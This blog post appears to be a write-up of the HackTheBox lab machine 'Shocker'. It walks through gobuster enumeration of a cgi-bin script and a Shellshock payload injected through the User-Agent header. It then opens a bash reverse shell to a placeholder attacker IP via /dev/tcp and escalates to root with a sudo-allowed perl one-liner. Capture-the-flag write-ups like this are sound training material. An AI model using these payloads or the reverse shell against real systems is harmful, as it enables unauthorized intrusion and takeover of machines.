---
layout: post
title:	"Shocker Writeup"
date:	2018-09-13 03:00:00
categories:
    - writeups
tags:
    - ctf
    - boot2root
    - hackthebox
---
<head>
	<title> Shocker Writeup | HackTheBox </title>
</head>

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/logo.png)

## i. Port Scan

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/ports.png)

## ii. Enumeration / Low Priv Shell

Starting off with http, browsing to host:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/http.png)

Nothing interesting, let's see if we can find any hidden directories using `gobuster`

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/gobuster1.png)

Wait... nothing found? That's because of two reasons: 
- gobuster by default does not show pages with 403 Status Codes (Forbidden). 
- the way that this apache is setup is that it'll report directories that do not have a / appended as 404.

Luckily for us, gobuster has those switches built-in. `-f to append directory flashes, and -s <status> for custom status codes`

Running gobuster with those two options:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/gobuster2.png)

~~~
$ gobuster -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 -f -s 403
~~~

Seems like we found a new directory, `cgi-bin`, navigating to it we get the 403 mentioned before.

Let's see if we can use gobuster to find any files in the directory. Typically there are .sh files in /cgi-bin/, so we can use `-x` in gobuster for custom extensions.

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/gobuster3.png)

Navigating to user.sh:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/download.png)

Downloading the file, and looking at the contents, we can see that the script is executing uptime when being called:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/uptime.png)

Let's try testing if the page is vulnerable to Shellshock since bash is involved.

~~~
Two great reads on how Shellshock works & how it's exploited:
https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability
https://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited
~~~

Using Burp's repeater would make this easier, as we do not have to download the file every time to see the output:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/burp1.png)

The payload that I'm going to be using: 
~~~
() { :; }; echo; /bin/ls

If you want to execute another command, make sure you include the full path. ($ which command)
~~~

This will list the contents in the directory. I'm going to insert the payload into User-Agents. (You can use several HTTP-Headers such as User-Agent, Cookie, Accept, etc.)

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/shellshock.png)

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/response.png)

Looking at the response, we see that it prints out the directory contents, which means we have `command execution`

In order to get a low-privilege shell, I am going to use the bash reverse shell one-liner.

~~~
$ bash -i >& /dev/tcp/YOURIP/PORT 0>&1

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
~~~

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/request2.png)

Looking at our listener:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/revshell.png)

## iii. Privilege Escalation

While enumerating the system, I checked `sudo -l` to see what commands can be ran as root:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/sudo.png)

We can run perl as root without a password.

Using a perl one-liner to spawn a shell with root privileges.

~~~
perl —e 'exec "/bin/sh";'

https://netsec.ws/?p=337
~~~
You won't see any output at first, but try executing a command.

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/root.png)

##. iv. Conclusion

This box is great practice for Shellshock. Though, it's hard to find it in the wild nowadays, it's still a good idea to add it to your foundation.

~~~
Sources / Links:
[0]: https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability
[1]: https://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited
[2]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[3]: https://netsec.ws/?p=337
~~~


